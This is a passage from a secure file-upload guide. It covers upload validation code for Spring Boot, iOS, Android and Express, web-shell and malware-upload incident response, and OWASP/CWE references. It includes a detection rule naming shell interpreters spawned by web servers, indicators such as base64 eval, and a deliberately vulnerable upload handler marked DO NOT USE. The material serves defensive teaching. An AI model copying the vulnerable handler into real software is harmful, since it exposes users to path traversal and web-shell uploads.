            if (!targetPath.normalize().startsWith(UPLOAD_DIR)) {
                return ResponseEntity.badRequest()
                    .body(Map.of("error", "Invalid file path"));
            }

            // Save file
            Files.copy(file.getInputStream(), targetPath,
                StandardCopyOption.REPLACE_EXISTING);

            // Set non-executable permissions
            Set<PosixFilePermission> perms = PosixFilePermissions.fromString("rw-r-----");
            Files.setPosixFilePermissions(targetPath, perms);

            return ResponseEntity.status(HttpStatus.CREATED)
                .body(Map.of(
                    "id", safeFilename.replace(extension, ""),
                    "type", detectedType,
                    "size", file.getSize()
                ));

        } catch (IOException e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body(Map.of("error", "Upload failed"));
        }
    }
}
```

**Spring Boot configuration** (`application.yml`):

```yaml
spring:
  servlet:
    multipart:
      max-file-size: 5MB
      max-request-size: 10MB
      file-size-threshold: 2KB  # Stream to disk above this
      location: /tmp/spring-uploads
server:
  tomcat:
    max-swallow-size: 5MB
```

### 7.4 Mobile — Image Picker Security

**iOS (Swift):**
```swift
// Validate picked image before upload
func processPickedImage(_ image: UIImage) -> Data? {
    // Re-encode to strip EXIF and potential payloads
    guard let jpegData = image.jpegData(compressionQuality: 0.85) else {
        return nil
    }

    // Validate size
    let maxSize = 5 * 1024 * 1024 // 5 MB
    guard jpegData.count <= maxSize else {
        return nil
    }

    // Verify magic bytes
    let header = [UInt8](jpegData.prefix(3))
    guard header == [0xFF, 0xD8, 0xFF] else {
        return nil
    }

    return jpegData
}
```

**Android (Kotlin):**
```kotlin
// Validate file before upload
fun validateUploadFile(context: Context, uri: Uri): Boolean {
    val contentResolver = context.contentResolver

    // Check MIME type from content resolver (not extension)
    val mimeType = contentResolver.getType(uri)
    val allowedTypes = setOf("image/jpeg", "image/png", "image/webp")
    if (mimeType !in allowedTypes) return false

    // Check file size
    val cursor = contentResolver.query(uri, null, null, null, null)
    val size = cursor?.use {
        it.moveToFirst()
        it.getLong(it.getColumnIndexOrThrow(OpenableColumns.SIZE))
    } ?: return false

    if (size > 5 * 1024 * 1024) return false // 5 MB limit

    // Validate magic bytes
    contentResolver.openInputStream(uri)?.use { stream ->
        val header = ByteArray(4)
        stream.read(header)
        val isJpeg = header[0] == 0xFF.toByte() && header[1] == 0xD8.toByte()
        val isPng = header.contentEquals(byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47))
        if (!isJpeg && !isPng) return false
    }

    return true
}
```

---

## 8. Incident Patterns

### 8.1 Web Shell Detection

**Indicators of compromise:**
- New or modified files in web-accessible directories with script extensions
  (.php, .jsp, .aspx, .py)
- Web server process spawning command-line interpreters (cmd.exe, /bin/bash, powershell)
- Unusual outbound connections from web server processes
- HTTP requests to unusual file paths with limited, geographically disparate sources
- Unusually large responses from specific URIs (data exfiltration)
- Recurring off-peak access times suggesting foreign operator timezone
- Files with obfuscated content (base64-encoded eval, gzinflate, char codes)

**Detection rules (SIEM/IDS):**
```yaml
# Elastic detection rule — web server spawning shell
rule:
  name: "Web Shell - Command Execution"
  description: "Detects web server process spawning command interpreters"
  type: eql
  query: |
    process where event.type == "start"
      and process.parent.name in ("httpd", "nginx", "w3wp.exe", "tomcat*", "node")
      and process.name in ("cmd.exe", "powershell.exe", "bash", "sh", "python*")

# File integrity monitoring — new files in webroot
rule:
  name: "New File in Web Root"
  description: "Alert on new script files created in web-accessible directories"
  type: file_integrity
  paths:
    - /var/www/html/**
    - /usr/share/nginx/html/**
  patterns:
    - "*.php"
    - "*.jsp"
    - "*.aspx"
    - "*.py"
    - "*.cgi"
```

**Response steps:**
1. Isolate the affected server — do not shut down (preserve forensic evidence)
2. Capture disk image and memory dump
3. Identify the web shell(s) — check for unusual files, compare against known-good baseline
4. Determine entry vector — review upload logs, access logs, and vulnerability scans
5. Search for lateral movement — check for credentials accessed, other systems contacted
6. Remove web shells and patch the entry vulnerability
7. Reset all credentials that may have been exposed
8. Implement file integrity monitoring to detect future web shells

### 8.2 Malware Upload Detection

**Indicators:**
- ClamAV or other scanner producing positive detections
- Files with executable headers in non-executable upload areas
- Files with mismatched extension and magic bytes (e.g., `.jpg` with `MZ` header)
- Spike in upload activity from a single IP or account
- Upload of known-bad file hashes (compare against threat intel feeds)

**Response:**
1. Quarantine the file immediately
2. Record the full upload chain: IP address, user account, timestamp, original filename
3. Hash the file (SHA-256) and check against VirusTotal and threat intelligence feeds
4. Determine if the file was served to any other users
5. If served, notify affected users and assess downstream impact
6. Block the source IP/account pending investigation
7. Review upload validation controls for bypass opportunities

### 8.3 Log Template for Upload Events

```json
{
  "event_type": "file_upload",
  "timestamp": "2026-03-08T12:00:00Z",
  "user_id": "usr_abc123",
  "ip_address": "203.0.113.42",
  "original_filename": "photo.jpg",
  "storage_filename": "a1b2c3d4-e5f6-7890-abcd-ef1234567890.jpg",
  "declared_content_type": "image/jpeg",
  "detected_content_type": "image/jpeg",
  "file_size_bytes": 2048576,
  "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb924...",
  "scan_result": "clean",
  "scan_engine": "ClamAV 1.4.1",
  "validation_passed": true,
  "storage_location": "s3://uploads-clean/2026/03/08/"
}
```

---

## 9. Compliance & Standards

### 9.1 OWASP References

| Reference | Relevance |
|-----------|-----------|
| **A01:2021 Broken Access Control** | Missing authorization checks on file download endpoints |
| **A03:2021 Injection** | Web shell execution, command injection via filenames |
| **A04:2021 Insecure Design** | Missing file upload validation architecture |
| **A05:2021 Security Misconfiguration** | Executable upload directories, missing headers |
| **A06:2021 Vulnerable Components** | Unpatched ImageMagick, outdated parsing libraries |
| **A08:2021 Software and Data Integrity** | Unverified file contents, missing malware scanning |

Source: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

### 9.2 CWE References

| CWE ID | Name | File Upload Context |
|--------|------|---------------------|
| **CWE-434** | Unrestricted Upload of File with Dangerous Type | Core file upload vulnerability |
| **CWE-22** | Path Traversal | Malicious filenames writing outside upload dir |
| **CWE-79** | Cross-site Scripting | SVG/HTML uploads with embedded scripts |
| **CWE-918** | Server-Side Request Forgery | "Upload from URL" fetching internal resources |
| **CWE-409** | Improper Handling of Highly Compressed Data | ZIP/decompression bombs |
| **CWE-611** | XXE | Malicious XML in DOCX/XLSX/SVG |
| **CWE-345** | Insufficient Data Authenticity Verification | Trusting Content-Type header |
| **CWE-770** | Allocation Without Limits | No file size limits |
| **CWE-367** | TOCTOU Race Condition | File accessible before scan completes |
| **CWE-639** | Authorization Bypass via User Key | Predictable file download URLs |

### 9.3 Regulatory Considerations

- **PCI DSS:** Requirement 6.5.8 — Improper access control, including insecure
  direct object references and unrestricted file upload
- **HIPAA:** File uploads containing PHI must be encrypted at rest and in transit;
  access must be logged and audited
- **GDPR:** Uploaded files containing personal data subject to data protection
  requirements; metadata (EXIF GPS) may constitute personal data
- **SOC 2:** File upload controls fall under CC6.1 (Logical and Physical Access Controls)
  and CC7.2 (System Monitoring)

---

## 10. Code Examples — Vulnerable vs. Secure

### 10.1 Vulnerable Upload Handler

```typescript
// VULNERABLE — DO NOT USE
import express from 'express';
import multer from 'multer';
import path from 'path';

const app = express();

// Problem 1: Stores in webroot with original filename
const storage = multer.diskStorage({
  destination: path.join(__dirname, 'public/uploads'),
  filename: (_req, file, cb) => cb(null, file.originalname),  // Path traversal risk!
});

// Problem 2: No file type or size restrictions
const upload = multer({ storage });

app.post('/upload', upload.single('file'), (req, res) => {
  // Problem 3: No content validation
  // Problem 4: No malware scanning
  // Problem 5: No authorization check
  // Problem 6: File immediately accessible at /uploads/<original-name>
  res.json({ url: `/uploads/${req.file!.originalname}` });
});
```

### 10.2 Secure Upload Handler (Complete)

```typescript
// SECURE — Production-ready upload handler
import express, { Request, Response, NextFunction } from 'express';
import multer from 'multer';
import { fileTypeFromBuffer } from 'file-type';
import sharp from 'sharp';
import { randomUUID, createHash } from 'crypto';
import { writeFile, mkdir } from 'fs/promises';
import path from 'path';
import rateLimit from 'express-rate-limit';

// --- Configuration ---
const UPLOAD_DIR = '/var/app/uploads';    // Outside webroot
const MAX_SIZE = 5 * 1024 * 1024;         // 5 MB
const ALLOWED_TYPES: Record<string, string> = {
  'image/jpeg': '.jpg',
  'image/png': '.png',
  'image/webp': '.webp',
};

// --- Middleware ---
const uploadMiddleware = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: MAX_SIZE, files: 1, fields: 5 },
});

const rateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,
  standardHeaders: true,
});

// --- Handler ---
async function handleSecureUpload(req: Request, res: Response): Promise<void> {
  if (!req.file) {
    res.status(400).json({ error: 'No file provided' });
    return;
  }

  // Step 1: Validate magic bytes
  const detected = await fileTypeFromBuffer(req.file.buffer);
  if (!detected || !(detected.mime in ALLOWED_TYPES)) {
    res.status(400).json({ error: 'File type not allowed' });
    return;
  }

  // Step 2: Re-encode image (strips metadata + neutralizes payloads)
  const processed = await sharp(req.file.buffer)
    .resize(2048, 2048, { fit: 'inside', withoutEnlargement: true })
    .toFormat(detected.ext as keyof sharp.FormatEnum)
    .toBuffer();

  // Step 3: Compute hash for deduplication and audit
  const hash = createHash('sha256').update(processed).digest('hex');

  // Step 4: Generate safe filename and path
  const fileId = randomUUID();
  const ext = ALLOWED_TYPES[detected.mime];
  const storagePath = path.join(UPLOAD_DIR, `${fileId}${ext}`);

  // Step 5: Save (after malware scan in production)
  await mkdir(UPLOAD_DIR, { recursive: true });
  await writeFile(storagePath, processed, { mode: 0o644 });

  // Step 6: Store metadata in database (pseudo-code)
  // await db.insert('uploads', {
  //   id: fileId,
  //   original_name: sanitizeFilename(req.file.originalname),
  //   mime_type: detected.mime,
  //   size: processed.length,
  //   hash,
  //   uploaded_by: req.user.id,
  //   scan_status: 'pending',
  // });

  // Step 7: Respond with file ID (not path)
  res.status(201).json({
    id: fileId,
    type: detected.mime,
    size: processed.length,
  });
}

// --- Routes ---
const app = express();
app.post('/api/upload', rateLimiter, uploadMiddleware.single('file'), handleSecureUpload);
```

### 10.3 Cloud Upload with Presigned URL (Full Flow)

```typescript
// Server: Generate presigned URL
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';
import { randomUUID } from 'crypto';

const s3 = new S3Client({ region: process.env.AWS_REGION });
const BUCKET = process.env.UPLOAD_BUCKET!;

app.post('/api/upload/request-url', rateLimiter, async (req, res) => {
  const { contentType, fileSize } = req.body;

  // Validate request
  if (!ALLOWED_TYPES[contentType]) {
    return res.status(400).json({ error: 'Content type not allowed' });
  }
  if (fileSize > MAX_SIZE) {
    return res.status(400).json({ error: 'File too large' });
  }

  const fileId = randomUUID();
  const key = `pending/${fileId}`;

  const command = new PutObjectCommand({
    Bucket: BUCKET,
    Key: key,
    ContentType: contentType,
    ServerSideEncryption: 'AES256',
    Metadata: {
      'uploaded-by': req.user.id,
      'original-type': contentType,
    },
  });

  const uploadUrl = await getSignedUrl(s3, command, { expiresIn: 300 });

  return res.json({ uploadUrl, fileId });
});

// After upload: Lambda trigger validates + moves to clean bucket
// S3 Event → Lambda → ClamAV scan → Move to 'clean/' prefix or 'quarantine/'
```

```typescript
// Client: Upload directly to S3
async function uploadFile(file: File): Promise<string> {
  // Step 1: Request presigned URL from our server
  const { uploadUrl, fileId } = await fetch('/api/upload/request-url', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      contentType: file.type,
      fileSize: file.size,
    }),
  }).then(r => r.json());

  // Step 2: Upload directly to S3
  const uploadResponse = await fetch(uploadUrl, {
    method: 'PUT',
    headers: { 'Content-Type': file.type },
    body: file,
  });

  if (!uploadResponse.ok) {
    throw new Error('Upload failed');
  }

  return fileId;
}
```

---

## References

- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- CWE-434: https://cwe.mitre.org/data/definitions/434.html
- ImageTragick: https://imagetragick.com/
- PortSwigger File Upload Vulnerabilities: https://portswigger.net/web-security/file-upload
- NSA/CISA Web Shell Detection Guide: https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF
- ClamAV Documentation: https://docs.clamav.net/
- AWS S3 Presigned URLs: https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html
- GCS Malware Scanning Architecture: https://docs.google.com/architecture/automate-malware-scanning-for-documents-uploaded-to-cloud-storage
- Equifax Breach Analysis: https://www.blackduck.com/blog/equifax-apache-struts-vulnerability-cve-2017-5638.html
